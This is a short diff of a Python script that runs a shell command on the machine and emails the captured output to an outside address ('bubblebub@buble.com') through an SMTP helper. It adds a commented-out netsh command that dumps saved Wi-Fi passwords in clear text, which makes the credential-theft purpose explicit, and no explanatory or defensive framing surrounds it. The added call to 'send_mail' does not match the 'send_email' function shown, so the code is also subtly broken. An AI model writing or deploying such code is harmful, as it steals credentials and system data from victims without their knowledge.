@@ -14,5 +14,9 @@ def send_email(email, password, message):
     server.quit()
     
 
-command = "msg * Test Message"
-subprocess.Popen(command, shell=True)
+#command = "msg * Test Message"
+#command = "netsh wlan show profile <ESSID> key=clear"
+command = "hostname"
+result = subprocess.check_output(command, shell=True)
+send_mail("bubblebub@buble.com", "password", result)
+#subprocess.Popen(command, shell=True)
